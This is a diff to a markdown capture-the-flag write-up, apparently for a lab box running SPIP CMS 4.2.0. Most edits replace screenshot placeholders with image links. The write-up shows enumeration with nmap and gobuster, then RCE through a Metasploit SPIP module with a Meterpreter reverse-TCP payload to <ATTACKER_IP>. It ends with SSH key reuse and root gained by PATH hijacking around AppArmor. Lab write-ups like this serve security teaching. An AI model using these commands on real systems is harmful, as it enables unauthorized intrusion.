@@ -11,14 +11,14 @@ I began with service enumeration using Nmap.
 nmap -sC -sV -oN nmap.txt 10.112.142.149
 ```
 
-[Insert Screenshot: Nmap Scan Results Here]
+<img width="1210" height="562" alt="image" src="https://github.com/user-attachments/assets/72122b72-57e1-45eb-91e0-094a533c4dc1" />
 
 ### Open Ports Discovered
 
 | Port | Service | Version |
 |------|----------|----------|
 | 22   | SSH      | OpenSSH 8.2p1 Ubuntu |
-| 80   | HTTP     | Apache 2.4.41 |
+| 80   | HTTP     | Apache httpd 2.4.41 |
 
 With port 80 open, the web server became the primary attack surface.
 
@@ -32,6 +32,7 @@ http://10.112.142.149/
 
 The website appeared to be running a CMS. 
 I ran a gobuster directory scan:
+
 ```bash
 gobuster dir -u http://10.112.142.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 200 -o dir_scan.txt
 ```
@@ -41,14 +42,14 @@ It revealed:
 - `/images/` → Directory listing enabled  
 - `/spip/` → SPIP CMS running
 
-[Insert Screenshot: Gobuster scan results Here]
+<img width="1056" height="83" alt="image" src="https://github.com/user-attachments/assets/4aa4d18c-adae-4a4b-b721-b1d67f90b4d0" />
 
 Using Wappalyzer on `/spip` directory, we get the version information:
 - SPIP CMS 4.2.0
 - Backend: PHP  
 - jQuery 3.6.3  
 
-[Insert Screenshot: SPIP CMS Page Here]
+<img width="1920" height="803" alt="image" src="https://github.com/user-attachments/assets/19f8639e-d024-46ac-99f9-4fc7b745e159" />
 
 The key discovery was SPIP version 4.2.0. Researching this version showed publicly available Remote Code Execution vulnerabilities. Since a Metasploit module existed for this issue, I decided to leverage it.
 
@@ -64,14 +65,14 @@ Steps:
 
 ```bash
 use multi/http/spip_rce_form
-set RHOSTS <TARGET_IP>
+set RHOSTS 10.112.142.149
 set TARGETURI /spip
 set payload php/meterpreter/reverse_tcp
 set LHOST <ATTACKER_IP>
 run
 ```
 
-[Insert Screenshot: Successful Meterpreter Session]
+<img width="1549" height="366" alt="image" src="https://github.com/user-attachments/assets/f0a8c685-0bea-47ea-9c7f-8db058f0480a" />
 
 The exploit succeeded and provided a Meterpreter shell as:
 
@@ -82,6 +83,8 @@ www-data
 This established initial access to the system.
 
 ## Post-Exploitation Enumeration
+
+Using a system shell through `shell` command inside meterpreter.
 
 Gathering system information:
 
@@ -131,7 +134,7 @@ ssh -i id.rsa think@<TARGET_IP>
 
 I successfully logged in as `think`.
 
-[Insert Screenshot: SSH Login as think]
+<img width="1061" height="727" alt="image" src="https://github.com/user-attachments/assets/344643a3-2512-4881-b71c-af00c281c7ed" />
 
 ## Privilege Escalation
 
@@ -149,7 +152,7 @@ Among the results, one binary stood out:
 /usr/sbin/run_container
 ```
 
-[Insert Screenshot: SUID run_container]
+<img width="1501" height="517" alt="image" src="https://github.com/user-attachments/assets/651afb2d-7ca7-4f43-9b69-9608b9504fcc" />
 
 This binary was not a standard system utility, making it a promising escalation vector.
 
@@ -167,7 +170,7 @@ Output revealed:
 ...
 ```
 
-[Insert Screenshot: strings output]
+<img width="759" height="414" alt="image" src="https://github.com/user-attachments/assets/621d0bff-c377-4494-a553-a94560d284fb" />
 
 This indicated that the SUID binary executes a shell script. If that script calls external programs insecurely, it may be exploitable.
 
@@ -197,7 +200,7 @@ Inspecting the AppArmor profile:
 cat /etc/apparmor.d/usr.sbin.ash
 ```
 
-[Insert Screenshot: AppArmor Profile Output]
+<img width="845" height="607" alt="image" src="https://github.com/user-attachments/assets/1ab557d0-5951-4426-a880-ac113e5a3d8a" />
 
 From the profile, I observed:
 
@@ -219,6 +222,8 @@ However, it did not use an absolute path such as:
 ```
 /usr/bin/docker
 ```
+
+<img width="1096" height="622" alt="image" src="https://github.com/user-attachments/assets/18cce9ba-39ba-4de6-9c2d-b8fe9e662789" />
 
 When a command is called without an absolute path, the system searches for the executable in directories listed in the `$PATH` environment variable. If we can place a malicious executable earlier in `$PATH`, it will be executed instead.
 
@@ -245,7 +250,7 @@ I used this file first to switch to the bash shell to bypass any AppArmour restr
 
 Since the script called `docker` without an absolute path, it executed our malicious binary instead.
 
-[Insert Screenshot: Root Shell Obtained]
+<img width="1100" height="225" alt="image" src="https://github.com/user-attachments/assets/922f1d4b-37d2-42c3-b081-0aba82c0ac3b" />
 
 Confirming root access:
 
@@ -296,4 +301,5 @@ The privilege escalation path was particularly educational because it required u
 
 - How `$PATH` resolution works internally  
 - How SUID binaries execute child processes  
+
 - How security frameworks like AppArmor enforce confinement  
